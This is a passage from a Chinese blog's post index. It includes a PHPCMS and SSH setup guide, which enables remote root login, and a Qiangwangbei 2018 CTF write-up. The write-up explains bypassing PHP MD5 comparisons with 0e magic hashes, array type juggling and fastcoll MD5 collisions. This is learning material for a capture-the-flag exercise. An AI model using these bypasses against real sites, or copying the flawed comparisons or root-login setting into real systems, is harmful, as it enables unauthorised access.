4·列表中所有的目录都必须可写，检测成功点“下一步”继续。 5·设置默认数据库连接和管理员帐户。 6·安装成功。 PS：在第四步可能出现文件权限设置不可写的问题。解决方法：将/var/www/html/phpcms目录所属用户和组修改为apache 123456789[root@localhost html]# [root@localhost html]# pwd/var/www/html[root@localhost html]# ls index.php itop phpcms[root@localhost html]# [root@localhost html]# chown -R apache:apache phpcms/[root@localhost html]# [root@localhost html]# chown: 无效的用户: “apache:apache”ubuntu 默认的apache用户是www-data而centos默认Apache用户是apache 安装成功以后，web就搭建成功了。 在Ubuntu搭建好以后，出现其他局域网内访问不完全的问题。百度一下以后。引用别人的话：局域网得以解决！结论：v9不适合在本机上调试！适合网络调试！原因：本机可以建立环境，但不能完全将V9路径修改为本机IP，具体原因还得官方来解释（测试了N编方法也用了好几种）！ 局域网调试方法：本机建立环境，然后在另一台电脑上进行安装，这样生成的路径就是正常的，不会产生localhost或者127.0.0.1这种东西了，调试一切正常！当然你也可以在目标主机上建立环境，在你的电脑上输入目标主机的ip访问安装，这样也行，算是废话！ 建议：建议官方能修改下，好多站长没有有力局域网调试环境！本机上不用安装ftp服务了，节省内存！也方便数据转移！ 搭建ssh1·切换到ROOT，开始更新 1apt-get update 2·安装SSH 1sudo apt-get install openssh-server 3.安装好后查看SSH是否启动打开”终端窗口”，输入”sudo ps -e |grep ssh“–&gt;回车–&gt;有sshd,说明ssh服务已经启动，如果没有启动，输入”sudo service ssh start“–&gt;回车–&gt;ssh服务就会启动 4.使用gedit修改配置文件”/etc/ssh/sshd_config” 获取远程ROOT权限打开”终端窗口”，输入”sudo gedit /etc/ssh/sshd_config“–&gt;回车–&gt;把配置文件中的”PermitRootLogin without-password“加一个”#”号,把它注释掉–&gt;再增加一句”PermitRootLogin yes“–&gt;保存，修改成功 5.查看Ubuntu 16.04的IP地址打开”终端窗口”，输入”sudo ifconfig“–&gt;回车–&gt;就可以查看到IP地址。 6.Xshell访问成功","categories":[{"name":"比赛日记","slug":"比赛日记","permalink":"/categories/%E6%AF%94%E8%B5%9B%E6%97%A5%E8%AE%B0/"}],"tags":[{"name":"比赛","slug":"比赛","permalink":"/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"强网杯","slug":"强网杯","date":"2018-03-25T16:00:00.000Z","updated":"2019-05-02T08:20:14.337Z","comments":true,"path":"2018/03/26/强网杯/","link":"","permalink":"/2018/03/26/%E5%BC%BA%E7%BD%91%E6%9D%AF/","excerpt":"强网杯比赛解题","text":"强网杯比赛解题 周末参加了第二届强网杯，被虐的遍体鳞伤，但是学习信息安全也就是用兴趣支撑起来的学习，所以哪怕被虐，也是要去见见世面的，所以以后不管怎么样都还是要多参加点比赛，学习信息安全，方向的选择很重要。师兄也提到过，ctf线上赛的题目涉及的范围很广。一个人很难做到全才，所以如果不是个人能力特别变态的那种，当然不乏存在这一类人啊，（但是我不是，所以还是默默估计好自己的兴趣，选择合适自己的方向学习。） 所以以后的学习日子还是会多去见见世面，坚持把这么一个比赛的日志写下来，哪怕还是被虐，但是能看到自己能解得题目越来越多了，应该感觉还不错。 讲讲题目吧。不扯那么多。我那时候这题没解出来，是队友给了一些思路，现在也看了一下大佬们的writeup，整理一下思路，写下来，也算是存下来，以后遇到就能再利用。 看下题目，一道web题（最简单的那道。捂脸ing）查看一下网页源代码。其实重要的是这一句。 12345&lt;!-- if($_POST['param1']!=$_POST['param2'] &amp;&amp; md5($_POST['param1'])==md5($_POST['param2']))&#123; die(\"success!\"); &#125; --&gt; 这句话啥意思呢，其实是一个判断语句，如果在输入框输入的两个字符串不相同，而他们的md5值相同，则返还success。理解意思了，思路就出来了呗。但是理解了，为了能加深印象，而且要明白这个是一个怎么样的漏洞，我们还得去琢磨一下。怎么了解他的漏洞，我得放出师兄给我的图。这道题运用了php的一个哈希比较缺陷，就是php在处理0e开头md5哈希字符串时，会将他看成 0 （具体下面那篇文章）PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 http://www.freebuf.com/news/67007.html 那么，我们构造两个不一样的字符，md5加密后以0E开头的，就可以验证成功 然后我百度了两个md5值相同的字符串不同的输入进去，第一关卡就过去了。yeah 来到第二个关卡老规矩，看源码。划重点 12345&lt;!-- if($_POST['param1']!==$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2']))&#123; die(\"success!\"); &#125; --&gt; 这句话啥意思呢？我也不懂，然后我百度了一下。===会比较两个变量的类型~ 而==只比较他们的值 比如整数0和浮点数0.0 用==比较返回TRUE 用===比较返回FLASE 那意思就很明显了啊，就是他们的值不相等，然后他们的类型相等。 那我作为一个软件工程的学生，首先的思路是什么（虽然我软件工程也学的很渣，唉~）就是类型强转了呗，把输入的两个东西强转成同类型的。 软件工程的类型强转是在编写的时候在代码哪里强转的，那我们做渗透的又没法去改人家源码是吧，那就是从数据包哪里进行类型强转了。这时候打开神器burp 直接强转成数组。 美滋滋！！！ 来到第三题 老规矩，老规矩！！！ 依旧是划重点 12345&lt;!-- if((string)$_POST['param1']!==(string)$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2']))&#123; die(\"success!); &#125; --&gt;当时就是卡在这里了，这里直接限制了类型是str类型。脑壳疼。这里是我不懂的，所以是去看了大佬们的writeup整理一下思路。下面我打算复制人家大佬的writeup了，我是弄懂了他弄得东西，但是我没怎么用过他的工具，肚子饿了也不去演示了，嘻嘻~ 我们用到了fastcoll_v1.0.0.5 这个软件，用来生成两个有着相同MD5值的文件。 先创建两个空的TXT文件，分别为1.txt和2.txt，两个文件名不一样即可 命令如下：这边已经生成了两个文件，我们校验一下他们的MD5值我们可以看到，他的MD5是相等的 那么我们怎么提交上去了？没错，就是URL编码成二进制 Py3代码如下就得到了两个文件的编码，我们通过burp抓包，然后把我们的东西提交上去成功的拿到了flag PS：这里西安的大佬说要构造一下XFF头，虽然不知道为什么，但还是听了一下大佬的话。 自此，MD5部分完成。 附上大佬的链接：https://www.cnblogs.com/Hg-Yyq/p/8641992.html","categories":[{"name":"比赛日记","slug":"比赛日记","permalink":"/categories/%E6%AF%94%E8%B5%9B%E6%97%A5%E8%AE%B0/"}],"tags":[{"name":"比赛","slug":"比赛","permalink":"/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"开始","slug":"开始","date":"2018-02-11T16:00:00.000Z","updated":"2019-03-08T07:35:10.957Z","comments":true,"path":"2018/02/12/开始/","link":"","permalink":"/2018/02/12/%E5%BC%80%E5%A7%8B/","excerpt":"从今天开始，好好学习，记录学习的每一步。","text":"从今天开始，好好学习，记录学习的每一步。","categories":[],"tags":[]}]}